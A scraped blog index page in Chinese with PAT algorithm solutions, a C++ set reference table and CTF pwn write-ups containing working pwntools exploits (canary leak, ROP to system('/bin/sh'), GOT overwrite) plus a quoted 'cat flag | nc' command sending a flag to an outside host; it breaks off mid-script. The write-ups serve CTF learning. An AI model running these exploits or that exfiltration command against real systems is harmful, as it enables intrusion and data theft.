class="number">0</span>;</div><div class="line">		<span class="keyword">for</span> (it = s[a].begin(); it != s[a].end(); it++)</div><div class="line">			<span class="keyword">if</span> (s[b].find(*it) != s[b].end())inN++;</div><div class="line">		allN = s[a].size() + s[b].size() - inN;</div><div class="line">		ans = (<span class="keyword">float</span>)inN / allN;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"%.1f%%\n"</span>, ans * <span class="number">100</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PAT</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/18/PAT-advanced-1063/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-C-STL-Set" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/18/C-STL-Set/">C++ STL Set</a>
    </h1>
  

        
        <a href="/2017/02/18/C-STL-Set/" class="archive-article-date">
  	<time datetime="2017-02-18T02:26:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-18</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p><code>set</code>集合容器：实现了红黑树的平衡二叉检索树的数据结构，插入元素时，它会自动调整二叉树的排列，把元素放到适当的位置，以保证每个子树根节点键值大于左子树所有节点的键值，小于右子树所有节点的键值；另外，还得保证根节点左子树的高度与右子树高度相等。<br>构造set集合主要目的是为了快速检索，<strong>不可</strong>直接去修改键值。</p>
<p><code>#include&lt;set&gt;</code></p>
<h2 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h2><table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">用法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">begin()</td>
<td style="text-align:center">返回指向第一个元素的迭代器</td>
</tr>
<tr>
<td style="text-align:center">clear()</td>
<td style="text-align:center">清除所有元素</td>
</tr>
<tr>
<td style="text-align:center">count()</td>
<td style="text-align:center">返回某个值元素的个数，实事上只返回<code>0</code>或<code>1</code>，不会重复插入</td>
</tr>
<tr>
<td style="text-align:center">empty()</td>
<td style="text-align:center">返回是否空</td>
</tr>
<tr>
<td style="text-align:center">end()</td>
<td style="text-align:center">指向最后一个元素后的一个迭代器，不是最后一个元素</td>
</tr>
<tr>
<td style="text-align:center">equal_range()</td>
<td style="text-align:center">返回集合中与给定值相等的上下限的两个迭代器</td>
</tr>
<tr>
<td style="text-align:center">erase()</td>
<td style="text-align:center">删除集合中的元素</td>
</tr>
<tr>
<td style="text-align:center">find()</td>
<td style="text-align:center">返回被查找元素的迭代器</td>
</tr>
<tr>
<td style="text-align:center">get_allocator()</td>
<td style="text-align:center">返回集合的分配器</td>
</tr>
<tr>
<td style="text-align:center">insert()</td>
<td style="text-align:center">在集合中插入元素</td>
</tr>
<tr>
<td style="text-align:center">lower_bound()</td>
<td style="text-align:center">指向<code>&gt;=</code>某值的第一个元素的迭代器</td>
</tr>
<tr>
<td style="text-align:center">key_comp()</td>
<td style="text-align:center">返回一个用于元素间值比较的函数</td>
</tr>
<tr>
<td style="text-align:center">max_size()</td>
<td style="text-align:center">返回集合能容纳的元素的最大限值</td>
</tr>
<tr>
<td style="text-align:center">rbegin()</td>
<td style="text-align:center">返回集合中指向最后一个元素的反向迭代器</td>
</tr>
<tr>
<td style="text-align:center">rend()</td>
<td style="text-align:center">返回集合中指向第一个元素的反向迭代器</td>
</tr>
<tr>
<td style="text-align:center">size()</td>
<td style="text-align:center">集合中元素额数目</td>
</tr>
<tr>
<td style="text-align:center">swap()</td>
<td style="text-align:center">交换两个集合的变量</td>
</tr>
<tr>
<td style="text-align:center">upper_bound()</td>
<td style="text-align:center">返回大于某个值元素的迭代器</td>
</tr>
<tr>
<td style="text-align:center">value_comp()</td>
<td style="text-align:center">返回一个用于比较元素间值的函数</td>
</tr>
</tbody>
</table>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">STL</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/18/C-STL-Set/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-PAT-advanced-1041" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/18/PAT-advanced-1041/">PAT advanced 1041</a>
    </h1>
  

        
        <a href="/2017/02/18/PAT-advanced-1041/" class="archive-article-date">
  	<time datetime="2017-02-18T01:57:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-18</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>1041.Be Unique</p>
<p>Being unique is so important to people on Mars that even their lottery is designed in a unique way. The rule of winning is simple: one bets on a number chosen from [1, 104]. The first one who bets on a unique number wins. For example, if there are 7 people betting on 5 31 5 88 67 88 17, then the second one who bets on 31 wins.</p>
<p>Input Specification:</p>
<p>Each input file contains one test case. Each case contains a line which begins with a positive integer N (&lt;=105) and then followed by N bets. The numbers are separated by a space.</p>
<p>Output Specification:</p>
<p>For each test case, print the winning number in a line. If there is no winner, print “None” instead.</p>
<p>Sample Input 1:<br>7 5 31 5 88 67 88 17<br>Sample Output 1:<br>31</p>
<p>Sample Input 2:<br>5 888 666 666 888 888<br>Sample Output 2:<br>None</p>
</blockquote>
<p>不会啥好算法，空间换时间。。用一个数组记录每个数字出现的次数。</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span>  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span>  </span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxN = <span class="number">1e5</span> + <span class="number">10</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxM = <span class="number">1e4</span> + <span class="number">10</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n, flag, k, ans = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> m[maxN];</div><div class="line"><span class="keyword">int</span> c[maxM];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">cin</span> &gt;&gt; n;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">cin</span> &gt;&gt; m[i];</div><div class="line">		c[m[i]]++;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">		<span class="keyword">if</span> (c[m[i]] == <span class="number">1</span>)</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">cout</span> &lt;&lt; m[i];</div><div class="line">			<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">		&#125;</div><div class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"None"</span>;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PAT</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/18/PAT-advanced-1041/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-2017codgate-pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/17/2017codgate-pwn/">2017codgate pwn</a>
    </h1>
  

        
        <a href="/2017/02/17/2017codgate-pwn/" class="archive-article-date">
  	<time datetime="2017-02-17T10:55:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-17</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>话说一个笔误400分就没了= =，当时怎么就没发现呢，还是编程能力太差Orz</p>
<h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>简单题，和2017Ins的babypwn题目一样，除了32位变64位，后来才知道原来32位也可以构成ropchain，和64位一样的传参顺序，难道是如果栈上没有参数就到regs里去找？还是特殊函数传参方法不一样？总之知道<code>dup2</code>可以就好了，其他的接着在研究。。</p>
<p>程序没有在字符串后补<code>\00</code>,先覆盖<code>canary</code>的<code>\00</code>位泄露<code>canary</code>，然后泄露<code>libcbase</code>，然后<code>dup2</code>+<code>system</code>构成<code>ropchain</code>。</p>
<p>看了别人的wp，发现还有别的方法，由于程序里调用了<code>system</code>，可以先将用<code>recv</code>命令<code>cat flag | nc reehy.top 6666</code>写到内存中比如<code>.data</code>，然后用<code>system(.data)</code>即可。</p>
<p>exp</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./babypwn'</span>)</div><div class="line"><span class="keyword">system</span> = <span class="number">0x8048620</span></div><div class="line"><span class="keyword">system</span> = elf.symbols[<span class="string">'system'</span>]</div><div class="line"><span class="built_in">send</span> = elf.symbols[<span class="string">'send'</span>]</div><div class="line">system_got = elf.got[<span class="string">'system'</span>]</div><div class="line">send_got = elf.got[<span class="string">'send'</span>]</div><div class="line">start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</div><div class="line">exit_got = elf.got[<span class="string">'exit'</span>]</div><div class="line">recv_got = elf.got[<span class="string">'recv'</span>]</div><div class="line">main = <span class="number">0x08048A71</span></div><div class="line">ret = <span class="number">0x08048572</span></div><div class="line">choose = <span class="number">0x080488B1</span></div><div class="line">ppr = <span class="number">0x08048b84</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">    context.log_level = <span class="string">'debug'</span></div><div class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</div><div class="line">    p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">8181</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    libc = ELF(<span class="string">'libc-2.19_16.so'</span>)</div><div class="line">    p = remote(<span class="string">'110.10.212.130'</span>, <span class="number">8889</span>)</div><div class="line"></div><div class="line">def canary():</div><div class="line">    p.recvuntil(<span class="string">'menu &gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Message :'</span>)</div><div class="line">    payload = <span class="string">'a'</span> * <span class="number">40</span></div><div class="line">    p.sendline(payload)</div><div class="line">    p.recvline()</div><div class="line">    <span class="keyword">a</span> = p.recvline()</div><div class="line">    canary = u32(<span class="string">'\x00'</span> + <span class="keyword">a</span>[<span class="number">0</span>:<span class="number">3</span>])</div><div class="line">    <span class="literal">return</span> canary</div><div class="line"></div><div class="line">def leak40(addr):</div><div class="line">    p.recvuntil(<span class="string">'menu &gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Message :'</span>)</div><div class="line">    <span class="built_in">offset</span> = <span class="string">'a'</span> * <span class="number">40</span> + p32(canary) + <span class="string">'a'</span> * <span class="number">8</span> + p32(<span class="number">0</span>)</div><div class="line">    payload = <span class="built_in">offset</span> + p32(<span class="built_in">send</span>) + p32(main)</div><div class="line">    payload += p32(<span class="number">4</span>) + p32(addr) + p32(<span class="number">4</span>) + p32(<span class="number">0</span>)</div><div class="line">    p.sendline(payload)</div><div class="line">    p.recvuntil(<span class="string">'menu &gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line">    p.recv(<span class="number">1</span>)</div><div class="line">    leak = u32(p.recv(<span class="number">4</span>))</div><div class="line">    <span class="literal">return</span> leak</div><div class="line"></div><div class="line">def dofomat():</div><div class="line">    p.recvuntil(<span class="string">'menu &gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Message :'</span>)</div><div class="line">    <span class="built_in">offset</span> = <span class="string">'a'</span> * <span class="number">40</span> + p32(canary) + <span class="string">'a'</span> * <span class="number">8</span> + p32(<span class="number">0</span>)</div><div class="line">    payload = <span class="built_in">offset</span></div><div class="line">    payload += p32(dup2) + p32(ppr) + p32(<span class="number">4</span>) + p32(<span class="number">0</span>)  <span class="comment"># failed!</span></div><div class="line">    payload += p32(dup2) + p32(ppr) + p32(<span class="number">4</span>) + p32(<span class="number">1</span>)</div><div class="line">    payload += p32(<span class="keyword">system</span>) + p32(<span class="number">0</span>) +p32(binsh)</div><div class="line">    p.sendline(payload)</div><div class="line">    p.recvuntil(<span class="string">'menu &gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    canary = canary()</div><div class="line">    leak = leak40(send_got)</div><div class="line">    dup2 = libc.symbols[<span class="string">'dup2'</span>] - libc.symbols[<span class="string">'send'</span>] + leak</div><div class="line">    binsh = libc.search(<span class="string">'/bin/sh'</span>).next() - libc.symbols[<span class="string">'send'</span>] + leak</div><div class="line">    dofomat()</div><div class="line">    p.interactive()</div><div class="line">    p.<span class="built_in">close</span>()</div></pre></td></tr></table></figure>
      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/17/2017codgate-pwn/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-ZCTF2015-pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/17/ZCTF2015-pwn/">ZCTF2015 pwn</a>
    </h1>
  

        
        <a href="/2017/02/17/ZCTF2015-pwn/" class="archive-article-date">
  	<time datetime="2017-02-17T09:59:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-17</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>整理了一下ZCTF2015的pwn，看看出题思路。。</p>
<h2 id="guess-100"><a href="#guess-100" class="headerlink" title="guess 100"></a>guess 100</h2><p>这个应该时之前ctftime上的一个比赛的题，应该时zctf借鉴的。。我觉得这次也很有可能会出之前比赛的题目</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; checksec </div><div class="line">[*] <span class="string">'/home/ubuntu/ctf-problem/2015zctf/pwn/pwn1/guess'</span></div><div class="line"><span class="attr">    Arch:</span>     amd64<span class="bullet">-64</span>-little</div><div class="line"><span class="attr">    RELRO:</span>    Partial RELRO</div><div class="line"><span class="attr">    Stack:</span>    Canary found</div><div class="line"><span class="attr">    NX:</span>       NX enabled</div><div class="line"><span class="attr">    PIE:</span>      <span class="literal">No</span> PIE</div></pre></td></tr></table></figure>
<p>有canary，但是有栈溢出，栈溢出后<code>__stack_check_fail</code>会打印程序的名字，也就是<code>argv[0]</code>的值，我们溢出修改<code>argv[0]</code>的值为之前加载到内存的<code>flag</code>的地址即可。<br><a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf" target="_blank" rel="external">相关的ppt</a></p>
<p>断点在<code>fgets(&amp;::s, v8 + 1, stream);</code>，也就是<code>.text:0000000000400A61                 call    _fgets</code>前</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fseek(<span class="name">stream</span>, <span class="number">0</span>LL, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">fgets(<span class="name">&amp;</span>:<span class="symbol">:s</span>, v8 + <span class="number">1</span>, stream)<span class="comment">;</span></div><div class="line">fclose(<span class="name">stream</span>)<span class="comment">;</span></div></pre></td></tr></table></figure>
<p>gdb查看得到加载的地址</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; pd</div><div class="line"> ► <span class="number">0x400a61</span>    <span class="keyword">call</span>   fgets@plt                     &lt;<span class="number">0x400800</span>&gt;</div><div class="line"><span class="symbol">        s:</span> <span class="number">0x6010c0</span> ◂— <span class="number">0x0</span></div><div class="line"><span class="symbol">        n:</span> <span class="number">0x24</span></div><div class="line"><span class="symbol">        stream:</span> <span class="number">0x602010</span> ◂— <span class="number">0xfbad2488</span></div><div class="line"> </div><div class="line">   <span class="number">0x400a66</span>    <span class="keyword">mov</span>    <span class="built_in">rax</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span> - <span class="number">0x48</span>]</div><div class="line">   <span class="number">0x400a6a</span>    <span class="keyword">mov</span>    <span class="built_in">rdi</span>, <span class="built_in">rax</span></div><div class="line">   <span class="number">0x400a6d</span>    <span class="keyword">call</span>   fclose@plt                    &lt;<span class="number">0x4007a0</span>&gt;</div></pre></td></tr></table></figure>
<p>exp如下，第一个用于获取<code>flag</code>长度，第二个用于攻击：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"> </div><div class="line"> <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</div><div class="line">         payload = i *<span class="string">'a'</span></div><div class="line">         p = <span class="built_in">process</span>(<span class="string">'./guess'</span>)</div><div class="line">         print p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">         p.sendline(payload)</div><div class="line">         <span class="built_in">result</span> = p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">         <span class="keyword">if</span> <span class="string">'ZCTF'</span> <span class="keyword">in</span> <span class="built_in">result</span>:</div><div class="line">             print <span class="string">'len='</span>, i</div><div class="line">             p.<span class="built_in">close</span>()</div><div class="line">			 break</div><div class="line">         p.<span class="built_in">close</span>()</div></pre></td></tr></table></figure>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn import *</div><div class="line"> context.log_level = <span class="string">'debug'</span></div><div class="line"> </div><div class="line"> s = process(<span class="string">'./guess'</span>)</div><div class="line"> s.recvuntil(<span class="string">'please guess the flag:'</span>)</div><div class="line"> payload=<span class="string">'ZCTF&#123;'</span>+<span class="string">'A'</span>*(<span class="number">32</span>-<span class="number">5</span>) + <span class="string">'\x00'</span> + <span class="string">'a'</span>*<span class="number">263</span> + p64(<span class="number">0</span>x6010C5)</div><div class="line"> s.sendline(payload)</div><div class="line"> s.recvuntil(<span class="string">'***: '</span>)</div><div class="line"> flagt = s.recvuntil(<span class="string">'\n'</span>)[:<span class="number">27</span>]</div><div class="line"> <span class="built_in">flag</span>  = <span class="string">'ZCTF&#123;'</span></div><div class="line"> <span class="keyword">for</span> i <span class="built_in">in</span> flagt:</div><div class="line">     <span class="built_in">flag</span> += chr(ord(i)^ord(<span class="string">'A'</span>))</div><div class="line"> print <span class="built_in">flag</span></div><div class="line"> s.close()</div></pre></td></tr></table></figure>
<h2 id="note1-200"><a href="#note1-200" class="headerlink" title="note1 200"></a>note1 200</h2><p>checksec</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; checksec </div><div class="line">[*] <span class="string">'/home/ubuntu/ctf-problem/2015zctf/pwn/pwn2/note1'</span></div><div class="line"><span class="attr">    Arch:</span>     amd64<span class="bullet">-64</span>-little</div><div class="line"><span class="attr">    RELRO:</span>    Partial RELRO</div><div class="line"><span class="attr">    Stack:</span>    Canary found</div><div class="line"><span class="attr">    NX:</span>       NX enabled</div><div class="line"><span class="attr">    PIE:</span>      <span class="literal">No</span> PIE</div></pre></td></tr></table></figure>
<p>看了下程序，edit可以溢出修改到下一个note的指针，输出got表里puts的地址，因为这里的content是偏移了0x70位的，所以要减去0x70。最后修改atoi为system，输入/bin/sh</p>
<p>但是有一个地方不明白，got表的高8byte是什么？</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x602018</span> &lt;puts@got.plt&gt;:	<span class="number">0</span>x00007ffff<span class="number">7a7d690</span>	<span class="number">0</span>x00000<span class="number">00000400706</span></div><div class="line"><span class="number">0x602028</span> &lt;printf@got.plt&gt;:	<span class="number">0</span>x00007ffff<span class="number">7a63800</span>	<span class="number">0</span>x00007ffff7ad9650</div><div class="line"><span class="number">0x602038</span> &lt;read@got.plt&gt;:	<span class="number">0</span>x00007ffff<span class="number">7b04670</span>	<span class="number">0</span>x00007ffff<span class="number">7a2e740</span></div><div class="line"><span class="number">0x602048</span> &lt;strcmp@got.plt&gt;:	<span class="number">0</span>x00007ffff7aac9c0	<span class="number">0</span>x00000<span class="number">00000400766</span></div><div class="line"><span class="number">0x602058</span> &lt;malloc@got.plt&gt;:	<span class="number">0</span>x00007ffff<span class="number">7a91580</span>	<span class="number">0</span>x00007ffff7a7de70</div><div class="line"><span class="number">0x602068</span> &lt;atoi@got.plt&gt;:	<span class="number">0</span>x00007ffff7a44e80	<span class="number">0</span>x000000<span class="number">00004007a6</span></div></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">DEBUG = <span class="number">0</span></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">    context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./note1'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</div><div class="line"></div><div class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</div><div class="line">puts_got = elf.got[<span class="string">'puts'</span>]</div><div class="line">puts_off = libc.symbols[<span class="string">'puts'</span>]</div><div class="line">read_off = libc.symbols[<span class="string">'read'</span>]</div><div class="line">system_off = libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">p = process(<span class="string">'./note1'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(title, types, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.recvuntil(<span class="string">':'</span>)</div><div class="line">    p.sendline(title)</div><div class="line">    p.recvuntil(<span class="string">':'</span>)</div><div class="line">    p.sendline(types)</div><div class="line">    p.recvuntil(<span class="string">':'</span>)</div><div class="line">    p.sendline(content)</div><div class="line">    <span class="keyword">return</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(title,content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div 